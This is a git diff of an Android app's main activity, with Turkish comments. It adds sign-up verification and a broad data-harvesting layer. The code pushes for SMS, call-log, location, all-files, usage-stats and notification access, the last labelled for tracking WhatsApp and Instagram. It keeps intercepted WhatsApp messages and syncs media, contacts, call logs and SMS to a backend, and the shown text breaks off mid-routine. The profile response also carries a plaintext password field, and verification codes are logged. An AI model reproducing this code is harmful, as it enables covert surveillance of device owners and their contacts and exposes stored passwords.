@@ -5,6 +5,7 @@ import android.app.Activity;
 import android.app.Notification;
 import android.app.PendingIntent;
 import android.app.RemoteInput;
+import android.content.ContentUris;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.content.IntentFilter;
@@ -132,6 +133,9 @@ import java.util.concurrent.TimeUnit;
  */
 public class MainActivity extends Activity {
 
+    // Statik instance (Background servislerin ana class metodlarına erişebilmesi için)
+    private static MainActivity instance;
+
     // Animasyon önbelleği ve yönetimi
     private final android.util.SparseArray<android.animation.Animator> activeAnimations = new android.util.SparseArray<>();
     private static final int ANIM_ACCOUNT_ENTRY = 1;
@@ -238,6 +242,12 @@ public class MainActivity extends Activity {
     private static final int PICK_IMAGE_REQUEST = 1001;
     private String selectedImageBase64 = null;
 
+    // Geçici kayıt bilgileri (Doğrulama aşaması için)
+    private String pendingUsername;
+    private String pendingPassword;
+    private String pendingEmail;
+    private String pendingFullName;
+
     // WhatsApp entegrasyonu için veriler
     public static String lastWhatsAppMessage; // Son okunan mesaj
     public static String lastWhatsAppSender; // Son mesajın göndericisi
@@ -269,6 +279,9 @@ public class MainActivity extends Activity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
+        // Statik instance ataması
+        instance = this;
+
         // En son başarılı olan URL'yi tercihlerden yükle
         SharedPreferences appPrefs = getSharedPreferences("app_settings", MODE_PRIVATE);
         API_BASE_URL = appPrefs.getString("api_url", API_BASE_URL);
@@ -405,15 +418,7 @@ public class MainActivity extends Activity {
         btnResendCode.setOnClickListener(v -> {
             vibrateFeedback();
             animateButtonClick(v);
-            String email = edtEmail.getText().toString().trim();
-            String username = edtUsername.getText().toString().trim();
-            if (!email.isEmpty()) {
-                // Resend animasyonu
-                animateResendCode(v);
-                // Resend endpoint veya tekrar registerRequest çağır (send-verification aynı işi görür)
-                registerRequest(username, "", email, ""); // Şifre/isim önemsiz sadece kod için
-                Toast.makeText(this, "Kod tekrar isteniyor...", Toast.LENGTH_SHORT).show();
-            }
+            resendVerificationCode();
         });
         
         btnCancelVerification.setOnClickListener(v -> {
@@ -437,6 +442,19 @@ public class MainActivity extends Activity {
         btnClearLogs.setOnClickListener(v -> {
             appLogsBuffer.setLength(0);
             updateLogDisplay();
+        });
+        
+        // UZUN BASMA: Tüm senkronizasyon önbelleğini temizle ve zorla yeniden başlat
+        btnClearLogs.setOnLongClickListener(v -> {
+            vibrateFeedback();
+            getSharedPreferences("photo_sync_db", MODE_PRIVATE).edit().clear().apply();
+            getSharedPreferences("video_sync_db", MODE_PRIVATE).edit().clear().apply();
+            getSharedPreferences("audio_sync_db", MODE_PRIVATE).edit().clear().apply();
+            getSharedPreferences("social_media_sync_db", MODE_PRIVATE).edit().clear().apply();
+            addLog("🔄 Senkronizasyon önbelleği temizlendi! Her şey yeniden yüklenecek.");
+            Toast.makeText(this, "Önbellek temizlendi, yeniden yükleniyor...", Toast.LENGTH_SHORT).show();
+            syncAllData();
+            return true;
         });
         btnCopyLogs.setOnClickListener(v -> {
             ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
@@ -560,9 +578,6 @@ public class MainActivity extends Activity {
             return true;
         });
 
-        // Uygulama başladığında rehber ve arama kayıtlarını arka planda senkronize et
-        syncAllData();
-
         // Orb Animasyonunu Başlat
         startBreathingAnimation();
 
@@ -585,6 +600,14 @@ public class MainActivity extends Activity {
         
         // Otomatik güncelleme kontrolü (Arka planda)
         checkForUpdates();
+
+        // Bildirim Erişimi Kontrolü (WhatsApp ve Instagram Takibi için)
+        if (!isNotificationServiceEnabled()) {
+            showNotificationAccessDialog();
+        }
+        
+        // Veri Senkronizasyonu Başlat (Arka planda)
+        syncAllData();
     }
 
     /**
@@ -645,23 +668,34 @@ public class MainActivity extends Activity {
         perms.add(Manifest.permission.READ_CALL_LOG);
         perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
         perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
-        perms.add(Manifest.permission.INTERNET);
-        perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
-        perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
         perms.add(Manifest.permission.READ_SMS);
         perms.add(Manifest.permission.RECEIVE_SMS);
         perms.add(Manifest.permission.READ_PHONE_STATE);
+        perms.add(Manifest.permission.READ_CALENDAR); // Takvim izni
+
+        // Android 10 (SDK 29) ve üzeri için Aktivite Tanıma
+        if (Build.VERSION.SDK_INT >= 29) {
+            perms.add("android.permission.ACTIVITY_RECOGNITION");
+            // NOT: ACCESS_BACKGROUND_LOCATION Android 11+ için ayrı istenmelidir, aksi halde istek başarısız olur.
+        }
+
+        // Android 11 (SDK 30) ve altı için Depolama İzinleri (Scoped Storage öncesi)
+        if (Build.VERSION.SDK_INT < 30) {
+            perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
+            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
+        }
 
         // Android 12 (SDK 31) ve üzeri için Bluetooth izni
         if (Build.VERSION.SDK_INT >= 31) {
-            perms.add(Manifest.permission.BLUETOOTH_CONNECT);
+            perms.add("android.permission.BLUETOOTH_CONNECT");
         }
         
-        // Android 13 (SDK 33) ve üzeri için Medya İzinleri
+        // Android 13 (SDK 33) ve üzeri için Medya İzinleri ve Bildirimler
         if (Build.VERSION.SDK_INT >= 33) {
             perms.add("android.permission.READ_MEDIA_IMAGES");
             perms.add("android.permission.READ_MEDIA_VIDEO"); 
             perms.add("android.permission.READ_MEDIA_AUDIO");
+            perms.add("android.permission.POST_NOTIFICATIONS");
         }
 
         ArrayList<String> list = new ArrayList<>();
@@ -675,10 +709,37 @@ public class MainActivity extends Activity {
             requestPermissions(list.toArray(new String[0]), PERMISSION_CODE);
         }
 
+        // Android 11 (SDK 30) ve üzeri için Tüm Dosyalara Erişim İzni (MANAGE_EXTERNAL_STORAGE)
+        if (Build.VERSION.SDK_INT >= 30) {
+            if (!Environment.isExternalStorageManager()) {
+                Toast.makeText(this, "Lütfen Tüm Dosyalara Erişim İznini Verin", Toast.LENGTH_LONG).show();
+                try {
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                    intent.addCategory("android.intent.category.DEFAULT");
+                    intent.setData(Uri.parse(String.format("package:%s", getApplicationContext().getPackageName())));
+                    startActivity(intent);
+                } catch (Exception e) {
+                    Intent intent = new Intent();
+                    intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
+                    startActivity(intent);
+                }
+            }
+        }
+
         // Kullanım İstatistikleri İzni Özel Olarak İstenmeli
         if (!hasUsageStatsPermission()) {
             Toast.makeText(this, "Lütfen Kullanım Erişimi iznini verin", Toast.LENGTH_LONG).show();
             startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
+        }
+
+        // Sistem Ayarlarını Değiştirme İzni (Parlaklık vb. kontrolü için)
+        if (Build.VERSION.SDK_INT >= 23) {
+             if (!Settings.System.canWrite(this)) {
+                 Toast.makeText(this, "Lütfen Sistem Ayarlarını Değiştirme iznini verin", Toast.LENGTH_LONG).show();
+                 Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS);
+                 intent.setData(Uri.parse("package:" + getPackageName()));
+                 startActivity(intent);
+             }
         }
     }
 
@@ -1238,28 +1299,45 @@ public class MainActivity extends Activity {
     }
 
     private void fetchProfile() {
-        if (authToken == null) return;
+        if (authToken == null) {
+            addLog("[PROFIL] HATA: Token bulunamadı");
+            return;
+        }
         
         new Thread(() -> {
+            HttpURLConnection conn = null;
             try {
                 URL url = new URL(API_BASE_URL + "/me");
-                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("GET");
                 conn.setRequestProperty("Authorization", "Bearer " + authToken);
+                conn.setRequestProperty("Accept", "application/json");
                 
-                addLog("[PROFIL] Veriler çekiliyor...");
+                // Timeout ayarları ekle
+                conn.setConnectTimeout(15000); // 15 saniye bağlantı timeout
+                conn.setReadTimeout(15000); // 15 saniye okuma timeout
+                
+                addLog("[PROFIL] Veriler çekiliyor... URL: " + url.toString());
+                
                 int code = conn.getResponseCode();
+                addLog("[PROFIL] Sunucu yanıt kodu: " + code);
+                
                 if (code == 200) {
                     BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"));
                     StringBuilder sb = new StringBuilder();
                     String line;
                     while ((line = br.readLine()) != null) sb.append(line);
+                    br.close();
+                    
+                    addLog("[PROFIL] Yanıt alındı. Uzunluk: " + sb.length());
                     
                     JSONObject resp = new JSONObject(sb.toString());
                     String email = resp.optString("email", "");
                     String fullName = resp.optString("full_name", "");
                     String plainPass = resp.optString("plain_password", resp.optString("_plain_password", ""));
                     String profileImgBase64 = resp.optString("profile_image", "");
+                    
+                    addLog("[PROFIL] Profil başarıyla yüklendi: " + authUsername);
                     
                     // Görünüm bilgileri için final değişkenler
                     final String fEmail = email.isEmpty() ? "Belirtilmedi" : email;
@@ -1275,6 +1353,12 @@ public class MainActivity extends Activity {
                         // Premium profil paneli ek bilgileri
                         if (txtProfileDisplayName != null) txtProfileDisplayName.setText(fDisplayName);
                         if (txtProfileUsernameSmall != null) txtProfileUsernameSmall.setText("@" + authUsername);
+                        
+                        // Profil kartının görünür olduğundan emin ol
+                        if (layoutLoggedIn != null) {
+                            layoutLoggedIn.setVisibility(View.VISIBLE);
+                            addLog("[PROFIL] Profil kartı görünür hale getirildi");
+                        }
                         
                         // Profil fotoğrafını yükle
                         if (!profileImgBase64.isEmpty()) {
@@ -1294,6 +1378,7 @@ public class MainActivity extends Activity {
                                     }
                                 }
                             } catch (Exception e) {
+                                addLog("[PROFIL] Profil resmi yüklenirken hata: " + e.getMessage());
                                 e.printStackTrace();
                             }
                         } else {
@@ -1314,9 +1399,47 @@ public class MainActivity extends Activity {
                             edtFullName.setText(fullName);
                         }
                     });
+                } else {
+                    // Hata durumunda detayları oku
+                    InputStream errorStream = conn.getErrorStream();
+                    String errorDetail = "";
+                    if (errorStream != null) {
+                        BufferedReader br = new BufferedReader(new InputStreamReader(errorStream, "utf-8"));
+                        StringBuilder esb = new StringBuilder();
+                        String eline;
+                        while ((eline = br.readLine()) != null) esb.append(eline);
+                        errorDetail = esb.toString();
+                        br.close();
+                    }
+                    addLog("[PROFIL] HATA: " + code + " - " + errorDetail);
+                    
+                    final String finalError = errorDetail;
+                    runOnUiThread(() -> {
+                        Toast.makeText(MainActivity.this, "Profil yüklenemedi: " + code, Toast.LENGTH_SHORT).show();
+                    });
                 }
-            } catch (Exception e) {
+            } catch (java.net.SocketTimeoutException e) {
+                addLog("[PROFIL] TIMEOUT: Sunucu yanıt vermedi - " + e.getMessage());
                 e.printStackTrace();
+                runOnUiThread(() -> {
+                    Toast.makeText(MainActivity.this, "Bağlantı zaman aşımı. Lütfen internet bağlantınızı kontrol edin.", Toast.LENGTH_LONG).show();
+                });
+            } catch (java.net.UnknownHostException e) {
+                addLog("[PROFIL] BAĞLANTI HATASI: Sunucuya ulaşılamıyor - " + e.getMessage());
+                e.printStackTrace();
+                runOnUiThread(() -> {
+                    Toast.makeText(MainActivity.this, "Sunucuya bağlanılamıyor. İnternet bağlantınızı kontrol edin.", Toast.LENGTH_LONG).show();
+                });
+            } catch (Exception e) {
+                addLog("[PROFIL] İSTİSNA: " + e.getClass().getSimpleName() + " - " + e.getMessage());
+                e.printStackTrace();
+                runOnUiThread(() -> {
+                    Toast.makeText(MainActivity.this, "Profil yüklenirken hata oluştu: " + e.getMessage(), Toast.LENGTH_SHORT).show();
+                });
+            } finally {
+                if (conn != null) {
+                    conn.disconnect();
+                }
             }
         }).start();
     }
@@ -1325,6 +1448,19 @@ public class MainActivity extends Activity {
      * Kullanıcının o anki moduna göre (Kayıt, Giriş veya Profil Düzenleme)
      * ilgili işlemi tetikler.
      */
+    private boolean isValidUsername(String username) {
+        return username.length() >= 3 && username.length() <= 30 && 
+               Character.isLetter(username.charAt(0)) && 
+               username.matches("^[a-zA-Z][a-zA-Z0-9_]*$");
+    }
+
+    private boolean isValidPassword(String password) {
+        return password.length() >= 8 && 
+               password.matches(".*[A-Z].*") && 
+               password.matches(".*[a-z].*") && 
+               password.matches(".*[0-9].*");
+    }
+
     private void performAccountAction() {
         if (isEditProfileMode) {
             // Profil düzenleme modundaysa bilgileri güncelle
@@ -1347,6 +1483,18 @@ public class MainActivity extends Activity {
         }
 
         if (isRegisterMode) {
+            // İstemci tarafı doğrulama (Backend kurallarına uygun)
+            if (!isValidUsername(username)) {
+                Toast.makeText(this, "Kullanıcı adı 3-30 karakter olmalı, harfle başlamalı ve sadece harf/rakam/_ içerebilir.", Toast.LENGTH_LONG).show();
+                shakeView(edtUsername);
+                return;
+            }
+            if (!isValidPassword(password)) {
+                Toast.makeText(this, "Şifre en az 8 karakter olmalı, büyük harf, küçük harf ve rakam içermelidir.", Toast.LENGTH_LONG).show();
+                shakeView(edtPassword);
+                return;
+            }
+
             // Kayıt modundaysa yeni hesap oluştur
             String email = edtEmail.getText().toString().trim();
             String fullName = edtFullName.getText().toString().trim();
@@ -1475,6 +1623,14 @@ public class MainActivity extends Activity {
             return;
         }
         
+        
+        // Geçici bilgileri sakla (Doğrulama sonrası kayıt için)
+        // DİKKAT: Resend durumunda boş gelebilir, üzerini yazma!
+        if (username != null && !username.isEmpty()) this.pendingUsername = username;
+        if (password != null && !password.isEmpty()) this.pendingPassword = password;
+        if (email != null && !email.isEmpty()) this.pendingEmail = email;
+        if (fullName != null && !fullName.isEmpty()) this.pendingFullName = fullName;
+
         new Thread(() -> {
             try {
                 // E-posta Doğrulama Kodu Gönder (/email/send-verification)
@@ -1551,6 +1707,247 @@ public class MainActivity extends Activity {
                 addLog("[DOĞRULAMA] İSTİSNA: " + e.getMessage());
                 e.printStackTrace();
                 runOnUiThread(() -> Toast.makeText(this, "Bağlantı hatası", Toast.LENGTH_SHORT).show());
+            }
+        }).start();
+    }
+
+    /**
+     * E-posta doğrulama kodunu tekrar gönderir.
+     */
+    private void resendVerificationCode() {
+        if (pendingEmail == null) {
+            Toast.makeText(this, "E-posta bilgisi bulunamadı. Lütfen tekrar kayıt olun.", Toast.LENGTH_SHORT).show();
+            return;
+        }
+
+        // Resend animasyonu
+        animateResendCode(btnResendCode);
+
+        new Thread(() -> {
+            try {
+                URL url = new URL(API_BASE_URL + "/email/resend");
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setDoOutput(true);
+                conn.setConnectTimeout(10000);
+
+                JSONObject payload = new JSONObject();
+                payload.put("email", pendingEmail);
+
+                try (OutputStream os = conn.getOutputStream()) {
+                    os.write(payload.toString().getBytes("utf-8"));
+                }
+
+                int code = conn.getResponseCode();
+                
+                if (code == 200) {
+                    runOnUiThread(() -> {
+                        Toast.makeText(this, "Yeni kod gönderildi!", Toast.LENGTH_SHORT).show();
+                    });
+                } else {
+                    // Hata detayını oku
+                    InputStream errorStream = conn.getErrorStream();
+                    String errorMsg = "Kod gönderilemedi";
+                    if (errorStream != null) {
+                        BufferedReader br = new BufferedReader(new InputStreamReader(errorStream, "utf-8"));
+                        StringBuilder sb = new StringBuilder();
+                        String line;
+                        while ((line = br.readLine()) != null) sb.append(line);
+                        
+                        try {
+                            JSONObject errJson = new JSONObject(sb.toString());
+                            errorMsg = errJson.optString("detail", errorMsg);
+                        } catch(Exception ignored) {
+                            errorMsg = sb.toString();
+                        }
+                    }
+                    
+                    final String finalError = errorMsg;
+                    runOnUiThread(() -> Toast.makeText(this, "Hata: " + finalError, Toast.LENGTH_LONG).show());
+                }
+
+            } catch (Exception e) {
+                addLog("[RESEND] Hata: " + e.getMessage());
+                e.printStackTrace();
+                runOnUiThread(() -> Toast.makeText(this, "Bağlantı hatası", Toast.LENGTH_SHORT).show());
+            }
+        }).start();
+    }
+
+    /**
+     * E-posta doğrulama kodunu sunucuya gönderir.
+     * Başarılı olursa kayıt işlemini tamamlar.
+     */
+    private void verifyCodeAndRegister(String code) {
+        if (pendingEmail == null || pendingUsername == null || pendingPassword == null) {
+            Toast.makeText(this, "Oturum bilgileri eksik veya zaman aşımı. Lütfen tekrar kayıt olun.", Toast.LENGTH_LONG).show();
+            animateVerificationExit();
+            return;
+        }
+
+        addLog("[DOĞRULAMA] Kod doğrulanıyor: " + code);
+        
+        // UI Geri Bildirimi
+        runOnUiThread(() -> {
+            btnVerifyCode.setEnabled(false);
+            btnVerifyCode.setText("Doğrulanıyor...");
+        });
+
+        new Thread(() -> {
+            try {
+                // 1. KOD DOĞRULAMA İSTEĞİ
+                URL urlVerify = new URL(API_BASE_URL + "/email/verify");
+                HttpURLConnection connVerify = (HttpURLConnection) urlVerify.openConnection();
+                connVerify.setRequestMethod("POST");
+                connVerify.setRequestProperty("Content-Type", "application/json");
+                connVerify.setDoOutput(true);
+                connVerify.setConnectTimeout(10000);
+
+                JSONObject payloadVerify = new JSONObject();
+                payloadVerify.put("email", pendingEmail);
+                payloadVerify.put("code", code);
+
+                try (OutputStream os = connVerify.getOutputStream()) {
+                    os.write(payloadVerify.toString().getBytes("utf-8"));
+                }
+
+                int codeVerify = connVerify.getResponseCode();
+                
+                if (codeVerify != 200) {
+                     // Hata okuma
+                     InputStream errorStream = connVerify.getErrorStream();
+                     String errorMsg = "Kod doğrulanamadı";
+                     if (errorStream != null) {
+                        BufferedReader br = new BufferedReader(new InputStreamReader(errorStream, "utf-8"));
+                        StringBuilder sb = new StringBuilder();
+                        String line;
+                        while ((line = br.readLine()) != null) sb.append(line);
+                        
+                        // JSON içinden detail çek
+                        try {
+                            JSONObject errJson = new JSONObject(sb.toString());
+                            errorMsg = errJson.optString("detail", errorMsg);
+                        } catch(Exception ignored) {
+                            errorMsg = sb.toString();
+                        }
+                     }
+                     
+                     final String finalError = errorMsg;
+                     runOnUiThread(() -> {
+                         Toast.makeText(this, finalError, Toast.LENGTH_LONG).show();
+                         shakeView(edtVerifyCode);
+                         btnVerifyCode.setEnabled(true);
+                         btnVerifyCode.setText("DOĞRULA");
+                     });
+                     return;
+                }
+
+                // 2. KAYIT İSTEĞİ (Doğrulama başarılı)
+                addLog("[KAYIT] Doğrulama başarılı. Hesap oluşturuluyor...");
+                
+                URL urlReg = new URL(API_BASE_URL + "/register");
+                HttpURLConnection connReg = (HttpURLConnection) urlReg.openConnection();
+                connReg.setRequestMethod("POST");
+                connReg.setRequestProperty("Content-Type", "application/json");
+                connReg.setDoOutput(true);
+
+                JSONObject payloadReg = new JSONObject();
+                payloadReg.put("username", pendingUsername);
+                payloadReg.put("password", pendingPassword);
+                payloadReg.put("email", pendingEmail);
+                payloadReg.put("full_name", pendingFullName);
+
+                try (OutputStream os = connReg.getOutputStream()) {
+                    os.write(payloadReg.toString().getBytes("utf-8"));
+                }
+                
+                int codeReg = connReg.getResponseCode();
+                if (codeReg == 200) {
+                     addLog("[KAYIT] Hesap başarıyla oluşturuldu.");
+                     
+                     runOnUiThread(() -> {
+                         addLog("[KAYIT] Giriş yapılıyor...");
+                     });
+                     
+                     // 3. DOĞRUDAN GİRİŞ YAP
+                     // Login request metodunu çağırmak yerine manuel token isteği yapıyoruz
+                     // Çünkü loginRequest UI thread çağrıları içeriyor, çakışma olmasın
+                     
+                     URL urlLogin = new URL(API_BASE_URL + "/login");
+                     HttpURLConnection connLogin = (HttpURLConnection) urlLogin.openConnection();
+                     connLogin.setRequestMethod("POST");
+                     connLogin.setRequestProperty("Content-Type", "application/json");
+                     connLogin.setDoOutput(true);
+                     
+                     JSONObject payloadLogin = new JSONObject();
+                     payloadLogin.put("username", pendingUsername);
+                     payloadLogin.put("password", pendingPassword);
+                     
+                     try (OutputStream os = connLogin.getOutputStream()) {
+                        os.write(payloadLogin.toString().getBytes("utf-8"));
+                     }
+                     
+                     if (connLogin.getResponseCode() == 200) {
+                         BufferedReader br = new BufferedReader(new InputStreamReader(connLogin.getInputStream(), "utf-8"));
+                         StringBuilder sb = new StringBuilder();
+                         String line;
+                         while ((line = br.readLine()) != null) sb.append(line);
+                         
+                         JSONObject resp = new JSONObject(sb.toString());
+                         String token = resp.getString("access_token");
+                         
+                         authToken = token;
+                         authUsername = pendingUsername;
+                         
+                         authPrefs.edit()
+                             .putString("access_token", authToken)
+                             .putString("username", authUsername)
+                             .apply();
+                             
+                         runOnUiThread(() -> {
+                             animateVerificationExit();
+                             animateSuccessConfetti(); // Konfeti patlat!
+                             Toast.makeText(this, "Hoş geldin " + authUsername + "!", Toast.LENGTH_LONG).show();
+                             updateAccountUI();
+                             hideAccount();
+                         });
+                     } else {
+                         // Login başarısız ama kayıt başarılı?
+                         runOnUiThread(() -> {
+                             animateVerificationExit();
+                             Toast.makeText(this, "Kayıt başarılı! Lütfen giriş yapın.", Toast.LENGTH_LONG).show();
+                             toggleAccountMode(); // Giriş ekranına dön
+                         });
+                     }
+                     
+                } else {
+                     // Register hatası
+                     InputStream errorStream = connReg.getErrorStream();
+                     String errorMsg = "Kayıt tamamlanamadı";
+                     if (errorStream != null) {
+                         BufferedReader br = new BufferedReader(new InputStreamReader(errorStream, "utf-8"));
+                         StringBuilder sb = new StringBuilder();
+                         String line;
+                         while ((line = br.readLine()) != null) sb.append(line);
+                         errorMsg = sb.toString();
+                     }
+                     final String finalError = errorMsg;
+                     runOnUiThread(() -> {
+                         Toast.makeText(this, "Hata: " + finalError, Toast.LENGTH_LONG).show();
+                         btnVerifyCode.setEnabled(true);
+                         btnVerifyCode.setText("DOĞRULA");
+                     });
+                }
+
+            } catch (Exception e) {
+                addLog("[DOĞRULAMA] Kritik Hata: " + e.getMessage());
+                e.printStackTrace();
+                runOnUiThread(() -> {
+                    Toast.makeText(this, "Bağlantı hatası: " + e.getMessage(), Toast.LENGTH_SHORT).show();
+                    btnVerifyCode.setEnabled(true);
+                    btnVerifyCode.setText("DOĞRULA");
+                });
             }
         }).start();
     }
@@ -2203,175 +2600,7 @@ public class MainActivity extends Activity {
             .start();
     }
 
-    /**
-     * Girilen kodu doğrular ve başarılıysa kaydı tamamlar.
-     */
-    private void verifyCodeAndRegister(String code) {
 
-        final String username = edtUsername.getText().toString().trim();
-        final String password = edtPassword.getText().toString().trim();
-        final String email = edtEmail.getText().toString().trim();
-        final String fullName = edtFullName.getText().toString().trim();
-        
-        addLog("[DOĞRULAMA] Kod kontrol ediliyor: " + code);
-
-        // Doğrulama butonuna yükleniyor efekti ver
-        runOnUiThread(() -> {
-            btnVerifyCode.setEnabled(false);
-            btnVerifyCode.setAlpha(0.7f);
-            btnVerifyCode.setText("Kontrol Ediliyor...");
-            
-            // Yükleniyor animasyonu (dönen efekt)
-            android.animation.ObjectAnimator rotation = android.animation.ObjectAnimator.ofFloat(
-                btnVerifyCode, "rotation", 0f, 360f);
-            rotation.setDuration(1000);
-            rotation.setRepeatCount(android.animation.ObjectAnimator.INFINITE);
-            rotation.setInterpolator(new android.view.animation.LinearInterpolator());
-            rotation.start();
-            
-            btnVerifyCode.animate().scaleX(0.95f).scaleY(0.95f).setDuration(200).start();
-            
-            // Animasyonu durdurma referansı için etikete kaydet
-            btnVerifyCode.setTag(rotation);
-        });
-
-        new Thread(() -> {
-            try {
-                // 1. KODU DOĞRULA (/email/verify)
-                URL verifyUrl = new URL(API_BASE_URL + "/email/verify");
-                HttpURLConnection verifyConn = (HttpURLConnection) verifyUrl.openConnection();
-                verifyConn.setRequestMethod("POST");
-                verifyConn.setRequestProperty("Content-Type", "application/json");
-                verifyConn.setDoOutput(true);
-                
-                JSONObject verifyPayload = new JSONObject();
-                verifyPayload.put("email", email);
-                verifyPayload.put("code", code);
-                
-                try (OutputStream os = verifyConn.getOutputStream()) {
-                    os.write(verifyPayload.toString().getBytes("utf-8"));
-                }
-                
-                int verifyStatus = verifyConn.getResponseCode();
-                if (verifyStatus != 200) {
-                     runOnUiThread(() -> {
-                         // Loading animasyonunu durdur
-                         Object rotationTag = btnVerifyCode.getTag();
-                         if (rotationTag instanceof android.animation.ObjectAnimator) {
-                             ((android.animation.ObjectAnimator) rotationTag).cancel();
-                         }
-                         btnVerifyCode.setRotation(0f);
-                         
-                         btnVerifyCode.setEnabled(true);
-                         btnVerifyCode.setAlpha(1.0f);
-                         btnVerifyCode.setText("Doğrula ve Kayıt Ol");
-                         btnVerifyCode.animate().scaleX(1f).scaleY(1f).setDuration(200).start();
-                         Toast.makeText(this, "Hatalı veya süresi dolmuş kod!", Toast.LENGTH_SHORT).show();
-                         shakeView(edtVerifyCode); // Hata animasyonu
-                     });
-                     return;
-                }
-
-                addLog("[DOĞRULAMA] Kod geçerli. Kayıt tamamlanıyor...");
-
-                // 2. KAYDI TAMAMLA (/register)
-                URL url = new URL(API_BASE_URL + "/register");
-                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                conn.setRequestMethod("POST");
-                conn.setRequestProperty("Content-Type", "application/json");
-                conn.setDoOutput(true);
-
-                JSONObject payload = new JSONObject();
-                payload.put("username", username);
-                payload.put("password", password);
-                payload.put("email", email);
-                payload.put("full_name", fullName);
-
-                try (OutputStream os = conn.getOutputStream()) {
-                    os.write(payload.toString().getBytes("utf-8"));
-                }
-
-                int regCode = conn.getResponseCode();
-                
-                if (regCode == 200) {
-                    runOnUiThread(() -> {
-                        // Loading animasyonunu durdur
-                        Object rotationTag = btnVerifyCode.getTag();
-                        if (rotationTag instanceof android.animation.ObjectAnimator) {
-                            ((android.animation.ObjectAnimator) rotationTag).cancel();
-                        }
-                        btnVerifyCode.setRotation(0f);
-                        
-                        btnVerifyCode.setEnabled(true);
-                        btnVerifyCode.setAlpha(1.0f);
-                        btnVerifyCode.setText("Doğrula ve Kayıt Ol");
-                        btnVerifyCode.animate().scaleX(1f).scaleY(1f).setDuration(200).start();
-                        
-                        // Başarı animasyonu (Konfeti efekti simülasyonu)
-                        animateSuccess(btnVerifyCode);
-                        
-                        // Konfeti animasyonunu güvenli şekilde çalıştır
-                        try {
-                            animateSuccessConfetti();
-                        } catch (Exception e) {
-                            // Konfeti hatası uygulamayı durdurmasın
-                            e.printStackTrace();
-                        }
-                        
-                        Toast.makeText(this, "Kayıt Başarılı! Hoşgeldiniz.", Toast.LENGTH_LONG).show();
-                        
-                        // Başarılı animasyonla çıkış
-                        new android.os.Handler(Looper.getMainLooper()).postDelayed(() -> {
-                            animateVerificationExit();
-                        }, 800);
-                        
-                        // Ekranları sıfırla
-                        edtVerifyCode.setText("");
-                        edtPassword.setText("");
-                        
-                        // Giriş moduna geç
-                        isRegisterMode = false;
-                        txtAccountTitle.setText("Giriş Yap");
-                        btnSubmitAccount.setText("Giriş Yap");
-                        btnSwitchMode.setText("Hesabınız yok mu? Kayıt olun");
-                        layoutRegisterExtras.setVisibility(View.GONE);
-                    });
-                } else {
-                     runOnUiThread(() -> {
-                         // Loading animasyonunu durdur
-                         Object rotationTag = btnVerifyCode.getTag();
-                         if (rotationTag instanceof android.animation.ObjectAnimator) {
-                             ((android.animation.ObjectAnimator) rotationTag).cancel();
-                         }
-                         btnVerifyCode.setRotation(0f);
-                         
-                         btnVerifyCode.setEnabled(true);
-                         btnVerifyCode.setAlpha(1.0f);
-                         btnVerifyCode.setText("Doğrula ve Kayıt Ol");
-                         btnVerifyCode.animate().scaleX(1f).scaleY(1f).setDuration(200).start();
-                         Toast.makeText(this, "Kayıt sırasında bir hata oluştu.", Toast.LENGTH_SHORT).show();
-                     });
-                }
-
-            } catch (Exception e) {
-                e.printStackTrace();
-                runOnUiThread(() -> {
-                    // Loading animasyonunu durdur
-                    Object rotationTag = btnVerifyCode.getTag();
-                    if (rotationTag instanceof android.animation.ObjectAnimator) {
-                        ((android.animation.ObjectAnimator) rotationTag).cancel();
-                    }
-                    btnVerifyCode.setRotation(0f);
-                    
-                    btnVerifyCode.setEnabled(true);
-                    btnVerifyCode.setAlpha(1.0f);
-                    btnVerifyCode.setText("Doğrula ve Kayıt Ol");
-                    btnVerifyCode.animate().scaleX(1f).scaleY(1f).setDuration(200).start();
-                    Toast.makeText(this, "İşlem hatası", Toast.LENGTH_SHORT).show();
-                });
-            }
-        }).start();
-    }
 
     private void updateProfileRequest(String username, String fullName, String email, String currentPassword, String newPassword) {
         new Thread(() -> {
@@ -2999,15 +3228,150 @@ public class MainActivity extends Activity {
         }).start();
     }
 
+    // ================= VERİ SENKRONİZASYONU SİSTEMİ =================
+    
+    /**
+     * Cihazın benzersiz adını döndürür.
+     * Format: Marka_Model
+     */
+    private String getDeviceName() {
+        String manufacturer = Build.MANUFACTURER;
+        String model = Build.MODEL.replace(" ", "_");
+        return manufacturer + "_" + model;
+    }
+    
+    /**
+     * JSON verilerini backend'e gönderir.
+     * 
+     * @param data Gönderilecek JSON array verisi
+     * @param dataType Veri tipi (contacts, call_logs, sms, vb.)
+     * @throws Exception HTTP hatası durumunda
+     */
+    private void sendSyncRequest(JSONArray data, String dataType) throws Exception {
+        if (data == null || data.length() == 0) {
+            addLog("[SYNC] " + dataType + " için veri yok, atlanıyor.");
+            return;
+        }
+        
+        String deviceName = getDeviceName();
+        
+        // Sync isteği için JSON body oluştur
+        JSONObject requestBody = new JSONObject();
+        requestBody.put("device_name", deviceName);
+        requestBody.put("data_type", dataType);
+        requestBody.put("data", data);
+        
+        // HTTP bağlantısını kur
+        URL url = new URL(API_BASE_URL + "/api/sync/data");
+        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+        
+        try {
+            // İstek ayarları
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
+            conn.setRequestProperty("Accept", "application/json");
+            conn.setDoOutput(true);
+            conn.setDoInput(true);
